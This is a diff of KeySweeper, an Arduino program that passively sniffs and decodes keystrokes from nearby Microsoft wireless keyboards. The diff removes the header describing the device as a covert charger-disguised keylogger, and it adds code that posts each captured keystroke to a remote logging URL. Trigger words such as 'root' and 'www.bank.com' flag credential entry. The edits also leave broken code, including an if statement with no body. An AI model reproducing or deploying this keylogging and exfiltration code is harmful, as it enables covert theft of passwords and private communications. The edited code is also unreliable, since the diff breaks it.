@@ -1,35 +1,9 @@
 /*
 
  KeySweeper, by Samy Kamkar
- Dec 23, 2014
- 
- KeySweeper is a stealthy Arduino-based device, camoflauged as a 
- functioning USB wall charger, that wirelessly and passively sniffs, 
- decrypts, logs and reports back all keystrokes from any Microsoft 
- wireless keyboards in the area.
- 
- Keystrokes are sent back to the KeySweeper operator over the Internet 
- via GSM, or can optionally be stored on a flash chip and delivered 
- wirelessly when a secondary KeySweeper device comes within wireless 
- range of the target KeySweeper.
- 
- KeySweeper has the capability to send SMS alerts upon certain 
- keystrokes being typed, e.g. "www.bank.com". If KeySweeper is removed 
- from AC power, it appears to shutoff, however it continues to operate 
- covertly using an internal battery which is automatically recharged 
- upon reconnecting to AC power.
- 
- KeySweeper builds upon the awesome work and research from:
- - Travis Goodspeed of GoodFET (see goodfet.nrf)
- - Thorsten Schröder and Max Moser of KeyKeriki v2
- 
- KeySweeper uses the HID files from the KeyKeriki project to convert the HID values to keys.
- Check out these awesome, related projects!
- - http://www.remote-exploit.org/articles/keykeriki_v2_0__8211_2_4ghz/
+  - http://www.remote-exploit.org/articles/keykeriki_v2_0__8211_2_4ghz/
  - http://goodfet.sourceforge.net/clients/goodfetnrf/
- 
- */
-
+*/
 // unknown packets:
 // chan 52 -> 
 //    08: f0f0 f0f0 3daf 6dc9   593d af6d c959 3df0 
@@ -37,8 +11,7 @@
 //    08: 0a0a 0a0a c755 9733   a3c7 5597 33a3 c70a 
 //    08: 0a0a 0a0a c755 9733   a3c7 5597 33a3 c70a 
 
-
-/* pins:
+/* pins: arduino nano / uno
  nRF24L01+ radio:
  1: (square): GND
  2: (next row of 4): 3.3 VCC 
@@ -50,26 +23,28 @@
  8: IRQ: not used here
  
  W25Q80BV flash:
- 
- 
  */
-
-#include <SoftwareSerial.h>
-
 
 // log online to this url (only if ENABLE_GSM is defined)
 #define URL "samy.pl/keysweeper/log.php?"
 
 // support 2 triggers up to 20 bytes each (change this as you wish)
-#define TRIGGERS 3
+#define TRIGGERS 2
 #define TRIGGER_LENGTH 20
 char triggers[TRIGGERS][TRIGGER_LENGTH];
 void setTriggers()
 {
-  strncpy(triggers[0], "www.bank.com", TRIGGER_LENGTH-1);
-  strncpy(triggers[1], "test@test.org", TRIGGER_LENGTH-1);
-  strncpy(triggers[2], "root", TRIGGER_LENGTH-1);
+  strncpy(triggers[0], "", TRIGGER_LENGTH-1);
+  strncpy(triggers[1], "root", TRIGGER_LENGTH-1);
 }
+
+
+// pins on the microcontroller
+#define CE 53
+#define CSN 48 // normally 10 but SPI flash uses 10
+
+#define LED_PIN 6 // tie to USB led if you want to show keystrokes
+#define PWR_PIN 7 // are we powered via USB 
 
 
 // if you want to also monitor the keystrokes live,
@@ -90,8 +65,6 @@ uint32_t strokeTime = 0;
 // Serial baudrate
 #define BAUDRATE 115200
 
-
-
 #define sp(a) Serial.print(F(a))
 #define spl(a) Serial.println(F(a))
 #define pr(a) Serial.print(F(a))
@@ -101,7 +74,7 @@ uint32_t strokeTime = 0;
 #include "nRF24L01.h"
 #include "RF24.h"
 #include "mhid.h"
-
+#include "printf.h"
 
 
 #include <EEPROM.h>
@@ -111,8 +84,6 @@ uint32_t strokeTime = 0;
 #define E_LAST_CHAN  0x05 // 1 byte
 //#define E_CHANS      0x06 // 1 byte
 //#define E_FIRST_RUN  0x07 // 1 byte 
-
-
 
 #define csn(a) digitalWrite(CSN, a)
 #define ce(a) digitalWrite(CE, a)
@@ -124,7 +95,7 @@ uint32_t strokeTime = 0;
 //a9399d5fcd,05,08
 //a9399d5fcd,09,08
 // my keyboard channel has been on 0x19, 0x34, 0x05, 0x09, 0x2c
-long time;
+/* me love you */long time;
 uint8_t channel = 25; // [between 3 and 80]
 uint16_t lastSeq = 0;
 
@@ -253,26 +224,12 @@ char gotKeystroke(uint8_t* p)
   for (uint8_t i = 0; i < TRIGGERS; i++)
     // we do!
     if (strlen(triggers[i]) && strstr(stack, triggers[i]))
-      sendSms(i);
-
-  // store in flash for retrieval later
-  storeKeystroke(letter);
 
   // send keystroke to remote live monitor (backtracer)
   // and/or send to our remote server
   sendKeystroke(letter);
 
   return letter;
-}
-
-// send our sms when a trigger was found
-void sendSms(uint8_t j)
-{
-  pr("Found trigger word: ");
-  Serial.println(j);
-  
-  // clear our array so we don't trigger again
-  memset(&stack, 0, STACKLEN);  
 }
 
 void sendKeystroke(char letter)
@@ -292,10 +249,9 @@ void sendKeystroke(char letter)
     radio.startListening();
   }
 
-
+  // send to our remote server
+  post_http(letter);
 }
-
-
 
 /* microsoft keyboard packet structure:
  struct mskb_packet
@@ -318,7 +274,6 @@ void sendKeystroke(char letter)
  };
  */
 
-
 uint8_t flush_rx(void)
 {
   uint8_t status;
@@ -330,7 +285,6 @@ uint8_t flush_rx(void)
   return status;
 }
 
-
 uint8_t flush_tx(void)
 {
   uint8_t status;
@@ -341,7 +295,6 @@ uint8_t flush_tx(void)
 
   return status;
 }
-
 
 void ledOn()
 {
@@ -363,7 +316,6 @@ void loop(void)
   char ch = '\0';
   uint8_t pipe_num;
   //  spl("loop");
-
 
   // if our led is off (flash our led upon keystrokes for fun)
   if (strokeTime && millis() - strokeTime >= LED_TIME)
@@ -396,28 +348,6 @@ void loop(void)
       if (same)
         return;
     }
-
-    // is this our backtrace device asking for keystrokes?
-    if (p[0] == 'P' && p[1] == 'W' && p[2] == 'N')
-    {
-      sp("Got command from backtracer! ");
-      Serial.println((char)p[3]);
-
-      // reply to a hello, asking if we're there 
-      // this is to let a 2nd device quickly discover
-      // what channel (frequency) we're on
-      if (p[4] == 'H')
-      {
-        pr("got hello! send response\n");
-        radio.openWritingPipe(backtraceIt);
-        radio.setAutoAck(true); // only autoack during tx
-        radio.stopListening();
-        char r = 'I';
-        radio.write(&r, 1);
-        radio.setAutoAck(false); // don't autoack during rx
-        radio.startListening();
-      }
-
       return;
     }
 
@@ -510,7 +440,8 @@ void setupRadio()
   n(0x03, 0x03);
 
   radio.startListening();
-  radio.printDetails();
+  spl("SetupRadio_OK");
+  //radio.printDetails();
 }
 
 
@@ -520,9 +451,6 @@ void pipe(uint64_t address)
  n(RX_ADDR_P0, reinterpret_cast<const uint8_t*>(&address), 5);
  }
  */
-
-
-
 
 
 uint8_t read_register(uint8_t reg, uint8_t* buf, uint8_t len)                       
@@ -557,8 +485,8 @@ void scan()
 
   // FCC doc says freqs 2403-2480MHz, so we reduce 126 frequencies to 78
   // http://fccid.net/number.php?fcc=C3K1455&id=451957#axzz3N5dLDG9C
-  channel = EEPROM.read(E_LAST_CHAN);
-
+   channel = EEPROM.read(E_LAST_CHAN);
+  
   // the order of the following is VERY IMPORTANT
   radio.setAutoAck(false);
   radio.setPALevel(RF24_PA_MIN); 
@@ -573,26 +501,30 @@ void scan()
   radio.openReadingPipe(0, kbPipe);
   radio.disableCRC();
   radio.startListening();
-  radio.printDetails();
+  
+  //radio.printDetails();
 
+  
   // from goodfet.nrf - thanks Travis Goodspeed!
   while (1)
   {
+      
     if (channel > 80)
       channel = 3;
 
     sp("Tuning to ");
     Serial.println(2400 + channel);
     radio.setChannel(channel++);
-
+   
+   
     time = millis();
     while (millis() - time < wait)
-    {      
+    {     
       if (radio.available())
       {
+      
         radio.read(&p, PKT_SIZE);
-
-        if (p[4] == 0xCD)
+        if ((p[6] & 0x7F) << 1 == 0x0A)
         {
           sp("Potential keyboard: ");
           for (int j = 0; j < 8; j++)
@@ -600,8 +532,7 @@ void scan()
             Serial.print(p[j], HEX);
             sp(" ");
           }
-          spl("");
-
+       
           // packet control field (PCF) is 9 bits long, so our packet begins 9 bits in
           // after the 5 byte mac. so remove the MSB (part of PCF) and shift everything 1 bit
           if ((p[6] & 0x7F) << 1 == 0x0A && (p[7] << 1 == 0x38 || p[7] << 1 == 0x78))
@@ -634,127 +565,6 @@ void scan()
   }
 }
 
-// keep connected to our keysweeper to allow serial input
-void backtrace(uint8_t channel)
-{
-  uint8_t p[PKT_SIZE];
-
-  while (1)
-  {
-    if (radio.available())
-    {
-      uint8_t got = radio.read(&p, PKT_SIZE);
-      sp("Got pkt: ");
-      //      for (int i = 0; i < got; i++)
-      //        Serial.print((char)p[i]);
-      sp(" ");
-      for (int i = 0; i < got; i++)
-      {
-        Serial.print(p[i], HEX);
-        sp(" ");
-      }
-      spl("");
-    }
-
-    if (Serial.available() > 0)
-    {
-      p[0] = 'P';
-      p[1] = 'W';
-      p[2] = 'N';
-      p[3] = Serial.read();
-      sp("Sending PWN");
-      //  Serial.println((char)p[3]);
-      radio.stopListening();
-      radio.write(&p, 4);
-      radio.startListening(); 
-    }
-  }
-}
-
-// scan for a keysweeper device so we can pull logs off
-void scanForKeySweeper()
-{
-  uint8_t p[PKT_SIZE];
-  uint16_t wait = MS_PER_SCAN;
-
-  // FCC doc says freqs 2403-2480MHz
-  // http://fccid.net/number.php?fcc=C3K1455&id=451957#axzz3N5dLDG9C
-  channel = EEPROM.read(E_LAST_CHAN);
-
-  // the order of the following is VERY IMPORTANT
-  radio.setAutoAck(false);
-  radio.setPALevel(RF24_PA_MIN); 
-  radio.setDataRate(RF24_2MBPS);
-  radio.setPayloadSize(32);
-  // RF24 doesn't ever fully set this -- only certain bits of it
-  n(0x02, 0x00); 
-  // RF24 doesn't have a native way to change MAC length...
-  n(0x03, 0x03);
-  radio.setPayloadSize(32);
-  radio.enableDynamicPayloads();
-  radio.setChannel(channel);
-  radio.openReadingPipe(0, backtraceIt);
-  radio.openWritingPipe(backtraceIt);
-  radio.disableCRC();
-  radio.printDetails();
-
-  //  radio.startListening();
-
-  while (1)
-  {
-    uint8_t buf[8];
-    buf[0] = 'P';
-    buf[1] = 'W';
-    buf[2] = 'N';
-    buf[3] = 'H'; // hello packet
-
-    if (channel > 80)
-    {
-      channel = 3;
-      wait *= 2;
-    }
-
-    pr("[locating KeySweeper] Tuning to ");
-    Serial.println(2400 + channel);
-    radio.stopListening();
-    radio.setChannel(channel++);
-    radio.write(&buf, 4);
-    radio.startListening();
-
-    time = millis();
-    while (millis() - time < wait)
-    {
-      if (radio.available())
-      {
-        radio.read(&p, PKT_SIZE);
-        pr("k got ");
-        Serial.print(p[0], HEX);
-        pr(" ");
-        Serial.print(p[1], HEX);
-        pr(" ");
-        Serial.print(p[2], HEX);
-        pr(" ");
-        Serial.print(p[3], HEX);
-        prl("");
-
-        if (p[0] == 'I')
-        {
-          // we got the proper response to H - I...HI!
-          channel--; // we incremented this AFTER we set it
-          pr("Found our KeySweeper!!! Locked onto channel ");
-          Serial.println(channel);
-          EEPROM.write(E_LAST_CHAN, channel);
-
-          backtrace(channel);
-        }
-      }
-    }
-  }
-}
-
-
-
-
 void setup()
 {
   pinMode(LED_PIN, OUTPUT);
@@ -763,25 +573,14 @@ void setup()
   Serial.begin(BAUDRATE);
 
   setTriggers();
-  
+ 
+
   spl("Radio setup");
   radio.begin();
   spl("End radio setup");
-
-  // if we're the backtracer device (connect to a keysweeper to download logs)
-#ifdef BACKTRACER
-  scanForKeySweeper();
-#endif
-
-  // get channel and pipe
-#ifdef SCAN_FOR_KB
-  scan();
-#endif
-
   // make sure to resetup radio after the scan
   setupRadio();
 }
-
 
 
 
